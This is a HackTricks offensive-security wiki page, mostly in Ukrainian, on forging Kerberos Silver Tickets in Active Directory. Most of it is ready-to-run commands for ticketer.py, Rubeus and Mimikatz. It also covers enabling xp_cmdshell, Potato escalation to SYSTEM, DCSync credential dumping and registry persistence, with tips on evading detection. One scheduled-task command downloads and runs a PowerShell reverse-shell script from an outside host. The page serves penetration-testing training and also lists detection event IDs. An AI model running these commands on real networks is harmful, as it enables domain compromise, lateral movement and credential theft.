# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Атака **Silver Ticket** використовує експлуатацію service tickets у середовищах Active Directory (AD). Цей метод базується на **отриманні NTLM-хешу service account**, наприклад облікового запису комп'ютера, щоб підробити Ticket Granting Service (TGS) ticket. Маючи підроблений квиток, зловмисник може отримати доступ до певних сервісів у мережі, **вдаючи будь‑якого користувача**, зазвичай з метою отримання прав адміністратора. Наголошується, що використання AES-ключів для підробки квитків є безпечнішим і менш помітним.

> [!WARNING]
> Silver Tickets менш помітні, ніж Golden Tickets, тому що їм потрібен лише **хеш сервісного облікового запису**, а не облікового запису krbtgt. Однак вони обмежені тим конкретним сервісом, який атакують. Також достатньо просто вкрасти пароль користувача. Якщо ви скомпрометували **пароль облікового запису з SPN**, ви можете використати цей пароль для створення Silver Ticket, що імітує будь‑якого користувача перед цим сервісом.

### Modern Kerberos changes (AES-only domains)

- Windows updates starting **8 Nov 2022 (KB5021131)** default service tickets to **AES session keys** when possible and are phasing out RC4. DCs are expected to ship with RC4 **disabled by default by mid‑2026**, so relying on NTLM/RC4 hashes for silver tickets increasingly fails with `KRB_AP_ERR_MODIFIED`. Always extract **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) for the target service account.
- If the service account `msDS-SupportedEncryptionTypes` is restricted to AES, you must forge with `/aes256` or `-aesKey`; RC4 (`/rc4` or `-nthash`) will not work even if you hold the NTLM hash.
- gMSA/computer accounts rotate every 30 days; dump the **current AES key** from LSASS, Secretsdump/NTDS, or DCsync before forging.
- OPSEC: default ticket lifetime in tools is often **10 years**; set realistic durations (e.g., `-duration 600` minutes) to avoid detection by abnormal lifetimes.

For ticket crafting, different tools are employed based on the operating system:

### On Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### У Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Служба CIFS часто є ціллю для доступу до файлової системи жертви, але інші служби, такі як HOST і RPCSS, також можна експлуатувати для завдань і WMI-запитів.

### Приклад: MSSQL служба (MSSQLSvc) + Potato до SYSTEM

Якщо у вас є NTLM hash (або AES key) облікового запису служби SQL (наприклад, sqlsvc), ви можете підробити TGS для MSSQL SPN і видати себе за будь-якого користувача перед SQL-службою. Далі увімкніть xp_cmdshell, щоб виконувати команди від імені облікового запису служби SQL. Якщо цей token має SeImpersonatePrivilege, застосуйте ланцюжок Potato для підвищення до SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Якщо отриманий контекст має SeImpersonatePrivilege (часто так для сервісних облікових записів), використайте Potato variant щоб отримати SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Більше деталей про зловживання MSSQL та увімкнення xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques overview:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Доступні сервіси

| Тип сервісу                                | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Використовуючи **Rubeus** ви можете **запитати всі** ці квитки використавши параметр:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- **No preceding 4768/4769 on the DC** for the same client/service is a common indicator of a forged TGS being presented directly to the service.
- Abnormally long ticket lifetime or unexpected encryption type (RC4 when domain enforces AES) also stand out in 4769/4624 data.

## Персистенція

Щоб уникнути регулярної зміни пароля машинами кожні 30 днів встановіть `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` або можна встановити `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` на значення більше ніж 30днів щоб вказати період ротації, коли пароль машини має бути оновлений.

## Зловживання Service tickets

В наступних прикладах уявімо, що квиток отримано, видаючи себе за обліковий запис administrator.

### CIFS

З цим квитком ви зможете отримати доступ до `C$` та `ADMIN$` папок через **SMB** (якщо вони відкриті) і скопіювати файли в частину віддаленої файлової системи, просто зробивши щось на кшталт:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Ви також зможете отримати shell всередині host або виконувати довільні команди, використовуючи **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

З цим дозволом ви можете створювати заплановані завдання на віддалених комп'ютерах та виконувати довільні команди:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

За допомогою цих квитків ви можете **виконати WMI в системі жертви**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Знайдіть **більше інформації про wmiexec** на наступній сторінці:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### ХОСТ + WSMAN (WINRM)

За наявності доступу winrm до комп'ютера ви можете **отримати доступ до нього** та навіть отримати PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Перегляньте наступну сторінку, щоб дізнатися **більше способів підключення до віддаленого хоста за допомогою winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Зверніть увагу, що **winrm має бути активним і в режимі прослуховування** на віддаленому комп'ютері, щоб отримати до нього доступ.

### LDAP

З цією привілеєю ви можете зняти дамп бази даних DC за допомогою **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Дізнайтеся більше про DCSync** на наступній сторінці:


{{#ref}}
dcsync.md
{{#endref}}


## Посилання

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)



{{#include ../../banners/hacktricks-training.md}}
